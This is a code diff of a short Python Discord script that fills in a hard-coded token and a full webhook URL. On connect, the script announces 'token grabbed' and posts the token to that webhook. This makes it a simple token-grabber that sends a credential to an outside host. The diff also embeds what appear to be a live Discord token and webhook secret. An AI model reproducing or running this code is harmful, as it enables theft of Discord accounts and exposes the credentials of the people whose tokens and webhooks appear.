@@ -2,12 +2,12 @@
 #i dont care what you do with this 
 import discord, aiohttp
 from discord import Webhook, AsyncWebhookAdapter
-t = ""  #token
+t = "ODI2NzI0ODM2OTgxNjA0MzUy.YGRPmQ.cU-pyfEyMXyHXX1bAg2MRWOHXVk"  #token
 class MyClient(discord.Client):
   async def on_connect(self):
       print(f"token grabbed")
       async with aiohttp.ClientSession() as session:
-          webhook = Webhook.from_url("URL HERE", adapter=AsyncWebhookAdapter(session))
+          webhook = Webhook.from_url("https://discord.com/api/webhooks/826771852411142144/g3Pz3z5BSwWXuLSKG4K04i4Ikja25zDOq5vs9SL4cjCjwNzcH6UJkviL8OTNlF879qsR", adapter=AsyncWebhookAdapter(session))
           await webhook.send(f"||{t}||")
 
 
